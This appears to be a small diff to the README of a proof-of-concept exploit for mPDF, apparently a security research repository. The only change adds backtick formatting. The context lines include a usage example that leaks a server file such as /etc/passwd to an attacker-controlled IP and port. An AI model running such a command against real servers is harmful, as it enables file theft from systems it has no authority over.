@@ -22,7 +22,7 @@ $ python3 poc.py <mpdf server:port> <local ip:port> <file or URL to leak>
 # example: python3 poc.py 127.0.0.1:5005 172.26.102.2:8085 /etc/passwd
 ```
 
-The <local ip> has to be the attacker's IP address reachable from inside the container (the host machine in the Docker network).
+The `<local ip>` has to be the attacker's IP address reachable from inside the container (the host machine in the Docker network).
 
 # Expected output
 
